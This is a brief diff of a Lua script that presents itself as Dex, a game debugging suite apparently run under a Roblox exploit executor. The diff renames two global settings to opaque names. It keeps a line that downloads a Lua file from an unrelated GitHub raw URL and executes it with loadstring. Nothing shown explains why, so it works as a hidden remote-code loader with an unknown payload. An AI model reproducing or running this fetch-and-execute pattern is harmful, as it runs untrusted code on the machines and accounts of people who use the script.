@@ -7,8 +7,9 @@
 
 	Dex is a debugging suite designed to help the user debug games and find any potential vulnerabilities.
 ]]
-getgenv().Color = "black" 
-getgenv().TextColor = "rgb" 
+
+getgenv().PKJ = "b" 
+getgenv().SJJs = "rb" 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/tes.lua"))()
 
 local nodes = {}
